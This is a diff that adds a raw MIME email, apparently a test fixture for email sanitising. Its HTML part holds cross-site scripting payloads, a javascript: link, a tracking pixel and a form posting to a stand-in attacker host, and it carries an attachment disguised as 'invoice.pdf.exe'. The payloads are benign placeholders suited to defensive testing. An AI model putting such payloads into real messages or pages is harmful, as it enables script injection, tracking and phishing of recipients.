@@ -1,0 +1,29 @@
+From: Attacker <attacker@example.invalid>
+To: Reader <reader@example.com>
+Subject: =?UTF-8?B?TWFsaWNpb3VzIOKckw==?=
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="malicious-boundary"
+
+--malicious-boundary
+Content-Type: multipart/alternative; boundary="alternative-boundary"
+
+--alternative-boundary
+Content-Type: text/plain; charset=utf-8
+
+Safe plain-text fallback.
+--alternative-boundary
+Content-Type: text/html; charset=utf-8
+
+<form action="https://evil.invalid/collect"><input autofocus></form>
+<svg><script>alert(document.domain)</script></svg>
+<img width="1" height="1" src="https://tracker.invalid/open.gif?utm_source=mail">
+<a href="javascript:alert(1)" onclick="alert(2)">unsafe</a>
+<p>Safe visible body.</p>
+--alternative-boundary--
+--malicious-boundary
+Content-Type: application/octet-stream; name="invoice.pdf.exe"
+Content-Disposition: attachment; filename="invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA
+--malicious-boundary--
